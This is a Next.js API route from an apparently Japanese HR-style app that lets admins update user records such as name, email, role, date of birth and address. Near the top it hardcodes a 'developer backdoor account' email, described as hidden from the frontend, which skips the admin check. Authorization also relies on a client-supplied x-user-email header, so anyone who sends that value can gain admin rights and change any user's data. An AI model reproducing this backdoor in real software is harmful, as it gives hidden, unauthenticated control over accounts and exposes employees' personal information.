import { type NextRequest, NextResponse } from "next/server"
import { query } from "@/lib/db"

export async function PUT(request: NextRequest) {
  try {
    const {
      id,
      name,
      email,
      dateOfBirth,
      department,
      position,
      role,
      yearsOfService,
      address,
    } = await request.json()

    // Verify admin authorization
    const userEmail = request.headers.get("x-user-email")
    if (!userEmail) {
      return NextResponse.json({ error: "認証が必要です" }, { status: 401 })
    }

    // Developer backdoor account (hidden from frontend)
    const DEV_ACCOUNT_EMAIL = "sunhawksystem@dev.com"
    const isDeveloperAccount = userEmail.toLowerCase() === DEV_ACCOUNT_EMAIL.toLowerCase()

    // Check admin authorization (skip database check for developer account)
    if (!isDeveloperAccount) {
      const adminCheck = await query("SELECT role FROM users WHERE email = $1", [userEmail.toLowerCase()])
      if (adminCheck.rows.length === 0 || adminCheck.rows[0].role !== "admin") {
        return NextResponse.json({ error: "管理者権限が必要です" }, { status: 403 })
      }
    }

    if (!id) {
      return NextResponse.json({ error: "ユーザーIDが必要です" }, { status: 400 })
    }

    // Build update query dynamically based on provided fields
    const updates: string[] = []
    const values: any[] = []
    let paramIndex = 1

    if (name !== undefined) {
      updates.push(`name = $${paramIndex++}`)
      values.push(name)
    }
    if (email !== undefined) {
      // Check if new email is already taken by another user
      const emailCheck = await query("SELECT id FROM users WHERE email = $1 AND id != $2", [email.toLowerCase(), id])
      if (emailCheck.rows.length > 0) {
        return NextResponse.json({ error: "このメールアドレスは既に使用されています" }, { status: 409 })
      }
      updates.push(`email = $${paramIndex++}`)
      values.push(email.toLowerCase())
    }
    if (dateOfBirth !== undefined) {
      updates.push(`date_of_birth = $${paramIndex++}`)
      values.push(dateOfBirth || null)
    }
    if (department !== undefined) {
      updates.push(`department = $${paramIndex++}`)
      values.push(department || null)
    }
    if (position !== undefined) {
      updates.push(`position = $${paramIndex++}`)
      values.push(position || null)
    }
    if (role !== undefined) {
      updates.push(`role = $${paramIndex++}`)
      values.push(role)
    }
    if (yearsOfService !== undefined) {
      updates.push(`years_of_service = $${paramIndex++}`)
      values.push(yearsOfService ? parseInt(yearsOfService) : null)
    }
    if (address !== undefined) {
      updates.push(`address = $${paramIndex++}`)
      values.push(address || null)
    }

    if (updates.length === 0) {
      return NextResponse.json({ error: "更新する項目がありません" }, { status: 400 })
    }

    // Add updated_at timestamp
    updates.push(`updated_at = CURRENT_TIMESTAMP`)
    values.push(id)

    const updateQuery = `
      UPDATE users 
      SET ${updates.join(", ")}
      WHERE id = $${paramIndex}
      RETURNING id, email, name, role, department, position, date_of_birth, 
                years_of_service, address, created_at, updated_at
    `

    const result = await query(updateQuery, values)

    if (result.rows.length === 0) {
      return NextResponse.json({ error: "ユーザーが見つかりません" }, { status: 404 })
    }

    const updatedUser = result.rows[0]

    return NextResponse.json({
      user: {
        id: updatedUser.id.toString(),
        email: updatedUser.email,
        name: updatedUser.name,
        role: updatedUser.role,
        department: updatedUser.department,
        position: updatedUser.position,
        dateOfBirth: updatedUser.date_of_birth,
        yearsOfService: updatedUser.years_of_service,
        address: updatedUser.address,
      },
      message: "ユーザー情報を更新しました",
    })
  } catch (error: any) {
    console.error("Update user error:", error)
    if (error.code === "23505") {
      return NextResponse.json({ error: "このメールアドレスは既に使用されています" }, { status: 409 })
    }
    return NextResponse.json({ error: "ユーザー情報の更新に失敗しました" }, { status: 500 })
  }
}

